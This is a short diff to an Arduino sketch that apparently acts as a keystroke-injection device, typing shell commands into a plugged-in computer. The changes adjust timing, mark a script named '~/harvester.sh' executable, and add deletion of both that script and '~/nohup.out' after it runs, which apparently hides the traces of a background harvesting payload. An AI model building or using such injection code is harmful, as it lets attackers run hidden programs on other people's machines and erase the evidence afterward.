@@ -205,9 +205,11 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(50);
+  delay(100);
 
-  Keyboard.print("chmod +x ~/harvester.sh");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("chmod 755 ~/harvester.sh");
 
   typeKey(KEY_RETURN);
 
@@ -220,6 +222,12 @@ void setup()
   delay(50);
 
   Keyboard.print("rm -rf ~/harvester.sh");
+
+  typeKey(KEY_RETURN);
+
+  delay(50);
+
+  Keyboard.print("rm ~/nohup.out");
 
   typeKey(KEY_RETURN);
 
